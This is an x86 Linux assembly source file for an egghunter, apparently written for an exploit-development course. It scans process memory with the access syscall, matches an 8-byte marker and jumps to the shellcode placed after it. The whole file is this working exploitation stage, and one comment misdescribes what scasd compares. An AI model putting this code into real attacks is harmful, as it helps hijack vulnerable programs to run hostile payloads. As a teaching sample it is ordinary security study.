; Purpose:      Linux x86 Egghunting
; Author:       Mohit Suyal (@mosunit)
; Studen ID:    PA-16521
; Blog:         https://mosunit.com

global _start

section .text

_start:

        xor edx, edx            ; initialize edx

align_page:
        or dx, 0xffff           ; page alignment

traverse_page:
        inc edx                 ; incrementing through memory address

; access syscall
        lea ebx, [edx + 4]      ; Validate 8 bytes of contiguos memory
        push byte 0x21          ; sycall number for access syscall
        pop eax                 ; move syscall number in eax
        int 0x80

; validate memory address
        cmp al, 0xf2            ; check if EFAULT is encountered
        jz align_page           ; if access violation is encountered, jump to align a new page

; search egg
        mov eax, 0x50905090     ; load egg in eax
        mov edi, edx            ; load memory address in edi - to be used in scasd instruction
        scasd                   ; compare edx and edi to match first 4 bytes of the egg - then increment edi by 4
        jnz traverse_page       ; in case egg is not matched, jump to traverse next memory address

        scasd                   ; compare eax and [edi + 4] to match next 4 bytes of the egg
        jnz traverse_page               ; in case egg is not matched, jump to traverse next memory address

; jump to shellcode
        jmp edi                 ; jump to shellcode in case 8 bytes of egg is matched
